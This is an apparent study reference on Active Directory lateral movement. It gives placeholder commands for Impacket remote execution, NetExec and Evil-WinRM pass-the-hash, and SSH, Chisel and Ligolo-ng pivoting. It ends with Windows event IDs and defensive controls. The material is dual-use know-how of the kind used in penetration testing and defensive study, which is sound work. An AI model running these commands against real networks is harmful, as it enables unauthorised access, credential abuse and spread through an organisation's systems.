# Intro to Active Directory Lateral Movement

**Date:** 28 June 2026

---

# Overview

Lateral Movement is the process of moving from one compromised system to another inside an Active Directory (AD) environment using legitimate authentication mechanisms instead of exploiting new vulnerabilities.

The objective is to expand access, discover additional credentials, escalate privileges, and eventually compromise critical assets such as Domain Controllers.

---

# Prerequisites

Before performing lateral movement, the following are generally required:

- Valid credentials
  - Plaintext password
  - NTLM hash
  - Kerberos ticket

- Administrative permissions on the target system
  - Local Administrator
  - Remote Management Users (WinRM)
  - Appropriate remote execution permissions

---

# Tools Used

| Tool | Purpose |
|------|----------|
| Impacket | Collection of Python tools for remote administration and authentication |
| NetExec (NXC) | Authentication validation, enumeration, command execution |
| Evil-WinRM | Interactive PowerShell over WinRM |
| SSH | Secure remote access and pivoting |
| ProxyChains | Routes applications through SOCKS proxies |
| Chisel | HTTP-based tunneling |
| Ligolo-ng | Advanced pivoting using virtual network interfaces |

---

# 1. Impacket

## Purpose

Impacket is a collection of Python scripts used for interacting with Windows protocols.

It supports:

- SMB
- WMI
- DCOM
- Kerberos
- NTLM
- RPC

---

## Common Tools

### psexec.py

Purpose:
- Remote command execution through SMB
- Creates a temporary Windows Service
- Executes commands as SYSTEM

Command

```bash
psexec.py DOMAIN/USER:PASSWORD@TARGET
```

Hash Authentication

```bash
psexec.py -hashes LMHASH:NTHASH USER@TARGET
```

Purpose

- Obtain SYSTEM shell
- Remote administration
- Lateral movement

---

### wmiexec.py

Purpose

Executes commands using Windows Management Instrumentation (WMI).

Command

```bash
wmiexec.py DOMAIN/USER:PASSWORD@TARGET
```

Advantages

- No service installation
- Lower forensic footprint
- Does not upload binaries

---

### smbexec.py

Purpose

Remote execution using SMB services.

Command

```bash
smbexec.py DOMAIN/USER:PASSWORD@TARGET
```

Characteristics

- Creates temporary service
- Stores command output in temporary files

---

### dcomexec.py

Purpose

Remote execution using DCOM.

Command

```bash
dcomexec.py DOMAIN/USER:PASSWORD@TARGET
```

Useful when

- WMI unavailable
- PsExec blocked

---

### atexec.py

Purpose

Executes commands using Windows Task Scheduler.

Command

```bash
atexec.py DOMAIN/USER:PASSWORD@TARGET
```

Creates

- Scheduled task
- Executes once
- Deletes task afterwards

---

# 2. NetExec (NXC)

## Purpose

NetExec is a multi-protocol post-exploitation framework.

Supports

- SMB
- WinRM
- LDAP
- RDP
- MSSQL
- FTP
- SSH

---

## Verify SMB Authentication

```bash
nxc smb TARGET -u USER -p PASSWORD
```

Purpose

- Validate credentials
- Verify administrator access
- Enumerate target information

---

## Execute CMD Command

```bash
nxc smb TARGET -u USER -p PASSWORD -x "command"
```

Purpose

Execute a single CMD command remotely.

---

## Execute PowerShell Command

```bash
nxc smb TARGET -u USER -p PASSWORD -X "PowerShell Command"
```

Purpose

Run PowerShell remotely.

---

## Pass-the-Hash

```bash
nxc smb TARGET -u Administrator -H NTHASH --local-auth
```

Purpose

Authenticate using NTLM hash instead of plaintext password.

---

# 3. Evil-WinRM

## Purpose

Provides interactive PowerShell sessions over WinRM.

Default Ports

- HTTP 5985
- HTTPS 5986

---

## Password Authentication

```bash
evil-winrm -i TARGET -u USER -p PASSWORD
```

---

## Hash Authentication

```bash
evil-winrm -i TARGET -u USER -H NTHASH
```

---

## Features

- Interactive PowerShell
- Upload files
- Download files
- In-memory script execution
- DLL injection

---

# 4. SSH

## Purpose

- Secure remote shell
- Local Port Forwarding
- Dynamic SOCKS Proxy
- Pivoting

---

## Local Port Forward

```bash
ssh -L LOCALPORT:TARGET:REMOTEPORT USER@PIVOT -N
```

Purpose

Forward a single service through SSH.

---

## Dynamic SOCKS Proxy

```bash
ssh -D LOCALPORT USER@PIVOT -N
```

Purpose

Creates a SOCKS proxy for routing multiple tools.

---

# 5. ProxyChains

## Purpose

Routes TCP traffic through SOCKS proxies.

---

## Example

```bash
proxychains COMMAND
```

Examples

```bash
proxychains curl
```

```bash
proxychains nxc
```

```bash
proxychains psexec.py
```

---

## Benefits

- Reach inaccessible networks
- Internal reconnaissance
- Pivoting

---

# 6. Chisel

## Purpose

HTTP-based TCP tunneling.

Useful when SSH is unavailable.

---

## Server

```bash
chisel server --port 8080 --reverse
```

---

## Client

```bash
chisel client SERVER_IP:8080 R:1080:socks
```

---

# 7. Ligolo-ng

## Purpose

Advanced network pivoting using virtual interfaces.

---

## Proxy

```bash
proxy -selfcert
```

---

## Agent

```bash
agent -connect SERVER:11601
```

---

## Add Route

```bash
ip route add NETWORK dev ligolo
```

---

# Credential Reuse Techniques

## Pass-the-Hash (PtH)

Authenticate using NTLM hashes without knowing the password.

Supported by

- PsExec
- NetExec
- Evil-WinRM
- SMBExec

---

## Pass-the-Ticket (PtT)

Uses stolen Kerberos tickets for authentication.

Common Tool

- Mimikatz
- Rubeus

---

## Overpass-the-Hash

Converts NTLM hashes into Kerberos tickets.

Common Tool

- Mimikatz

---

## Token Impersonation

Uses existing Windows access tokens instead of passwords.

Common Tool

- Incognito
- Meterpreter

---

# Pivoting Methods

## SSH Local Port Forwarding

Forwards one specific service.

---

## SSH Dynamic Forwarding

Creates SOCKS proxy.

---

## Chisel

HTTP tunnel.

---

## Ligolo-ng

Virtual network interface.

---

# Important Windows Event IDs

| Event ID | Description |
|-----------|-------------|
| 4624 | Successful Logon |
| 4648 | Explicit Credentials Used |
| 4688 | Process Creation |
| 4697 | Service Installed |
| 4698 | Scheduled Task Created |
| 7045 | New Service Installed |

---

# Defensive Measures

## Windows LAPS

- Unique local administrator password
- Prevents password reuse

---

## Least Privilege

- Remove unnecessary local admin rights
- Separate admin accounts

---

## SMB Signing

Protects SMB communications against tampering.

---

## Restrict NTLM

Prefer Kerberos authentication.

---

## Credential Guard

Protects LSASS secrets.

---

## Host Firewall

Restrict

- SMB
- WinRM
- RDP

between workstations.

---

## Network Segmentation

Separate

- Workstations
- Servers
- Domain Controllers

using VLANs and firewall rules.

---

## Privileged Access Workstations (PAWs)

Dedicated administration systems for privileged users.

---

## Monitoring

Monitor

- Authentication events
- Service creation
- Scheduled tasks
- Process creation
- Remote logons

---

# Summary

This documentation provides a concise reference for:

- Remote execution tools
- Authentication methods
- Pass-the-Hash
- WinRM
- SMB execution
- Pivoting
- SOCKS proxies
- SSH tunneling
- Defensive controls
- Windows Event IDs

It serves as a quick reference for understanding Active Directory lateral movement techniques and the tools commonly used during post-exploitation.
